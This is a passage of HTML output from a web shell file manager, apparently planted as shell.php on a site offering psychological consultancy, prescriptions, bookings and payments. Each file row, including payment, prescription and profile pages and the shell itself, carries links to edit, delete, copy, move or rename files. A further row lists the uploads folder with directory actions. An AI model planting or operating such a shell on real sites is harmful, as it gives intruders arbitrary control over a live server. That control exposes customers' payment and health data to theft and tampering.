<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=payment.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=payment.php>Remame</a></td></tr>
<tr><td>payment_process.php</td><td>21.53 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=payment_process.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=payment_process.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=payment_process.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=payment_process.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=payment_process.php>Remame</a></td></tr>
<tr><td>payment_process_2.php</td><td>3.75 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=payment_process_2.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=payment_process_2.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=payment_process_2.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=payment_process_2.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=payment_process_2.php>Remame</a></td></tr>
<tr><td>phpinfo.php</td><td>0.02 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=phpinfo.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=phpinfo.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=phpinfo.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=phpinfo.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=phpinfo.php>Remame</a></td></tr>
<tr><td>precription-details.php</td><td>5.24 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=precription-details.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=precription-details.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=precription-details.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=precription-details.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=precription-details.php>Remame</a></td></tr>
<tr><td>prescription.php</td><td>4.79 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=prescription.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=prescription.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=prescription.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=prescription.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=prescription.php>Remame</a></td></tr>
<tr><td>privacy-policy.php</td><td>18.05 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=privacy-policy.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=privacy-policy.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=privacy-policy.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=privacy-policy.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=privacy-policy.php>Remame</a></td></tr>
<tr><td>profile.php</td><td>16.41 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=profile.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=profile.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=profile.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=profile.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=profile.php>Remame</a></td></tr>
<tr><td>psychological-consultancy.php</td><td>1.57 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=psychological-consultancy.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=psychological-consultancy.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=psychological-consultancy.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=psychological-consultancy.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=psychological-consultancy.php>Remame</a></td></tr>
<tr><td>psychological-consultant.php</td><td>6.33 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=psychological-consultant.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=psychological-consultant.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=psychological-consultant.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=psychological-consultant.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=psychological-consultant.php>Remame</a></td></tr>
<tr><td>register-2.php</td><td>3.93 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=register-2.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=register-2.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=register-2.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=register-2.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=register-2.php>Remame</a></td></tr>
<tr><td>school-program.php</td><td>3.49 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=school-program.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=school-program.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=school-program.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=school-program.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=school-program.php>Remame</a></td></tr>
<tr><td>shell.php</td><td>5.66 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=shell.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=shell.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=shell.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=shell.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=shell.php>Remame</a></td></tr>
<tr><td>success.php</td><td>0.3 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=success.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=success.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=success.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=success.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=success.php>Remame</a></td></tr>
<tr><td>terms-of-use.php</td><td>68.56 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=terms-of-use.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=terms-of-use.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=terms-of-use.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=terms-of-use.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=terms-of-use.php>Remame</a></td></tr>
<tr><td>thankyou.php</td><td>0.02 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=thankyou.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=thankyou.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=thankyou.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=thankyou.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=thankyou.php>Remame</a></td></tr>
<tr><td>uploads</td><td>81 Items</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html/uploads>Change directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rmdir&rm=uploads>Remove directory</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=uploads>Rename directory</a></td></tr>
<tr><td>user-booking.php</td><td>5.77 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=user-booking.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=user-booking.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=user-booking.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=user-booking.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=user-booking.php>Remame</a></td></tr>
<tr><td>user-calendar.php</td><td>6.25 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=user-calendar.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=user-calendar.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=user-calendar.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=user-calendar.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=user-calendar.php>Remame</a></td></tr>
<tr><td>user-dashboard.php</td><td>7.16 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=user-dashboard.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=user-dashboard.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=user-dashboard.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=user-dashboard.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=user-dashboard.php>Remame</a></td></tr>
<tr><td>user-profile.php</td><td>3.23 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=user-profile.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=user-profile.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=user-profile.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=user-profile.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=user-profile.php>Remame</a></td></tr>
<tr><td>user-reschedule.php</td><td>7.17 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=user-reschedule.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=user-reschedule.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=user-reschedule.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=user-reschedule.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=user-reschedule.php>Remame</a></td></tr>
<tr><td>yoga.php</td><td>1.88 KB</td><td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=edit&file=yoga.php>Edit</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=delete&file=yoga.php>Delete</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=copy&src=yoga.php>Copy</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=move&src=yoga.php>Move</a></td>
<td><a href = /shell.php?dir=/home/wzn9zp6mrlpp/public_html&mode=rename&old=yoga.php>Remame</a></td></tr>
</table>
